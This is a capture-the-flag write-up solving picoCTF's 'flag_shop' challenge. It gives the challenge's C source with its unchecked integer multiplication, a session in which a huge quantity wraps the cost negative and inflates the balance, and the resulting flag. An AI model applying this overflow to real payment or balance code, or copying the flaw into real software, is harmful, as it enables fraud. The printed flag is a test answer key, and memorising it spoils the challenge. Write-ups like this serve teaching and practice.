# Notes

## Challenge: flag_shop

A source file in C is given.

### Connection information

```bash
nc jupiter.challenges.picoctf.org 9745
```

### Given C source code

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while (con == 0)
    {
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if (menu == 1)
        {
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if (menu == 2)
        {
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if (auction_choice == 1)
            {
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");

                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if (number_flags > 0)
                {
                    int total_cost = 0;
                    total_cost = 900 * number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if (total_cost <= account_balance)
                    {
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else
                    {
                        printf("Not enough funds to complete purchase\n");
                    }
                }
            }
            else if (auction_choice == 2)
            {
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);

                if (bid == 1)
                {

                    if (account_balance > 100000)
                    {
                        FILE *f = fopen("flag.txt", "r");
                        if (f == NULL)
                        {

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                    }

                    else
                    {
                        printf("\nNot enough funds for transaction\n\n\n");
                    }
                }
            }
        }
        else
        {
            con = 1;
        }
    }
    return 0;
}
```

Compiling the source file.

### Command

```bash
gcc store.c
```

Running a.out provides the following output.Depending on the number input, the program will show different outputs. Connected using the nc connection also connects to the same program.

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

Going through the program it can be seen that there is a check for account balance **if (account_balance > 100000)**
it will provide the flag.So we need to make the account balance greater than 100000. Looks like using a overflow bug the account balance can be changed to a large number.

### Trying out the solution

```
>> nc jupiter.challenges.picoctf.org 9745

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
999999999

The final cost is: -1943133060

Your current balance after transaction: 1943134160

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection

```

### The flag

```
picoCTF{m0n3y_bag5_65d67a74}
```
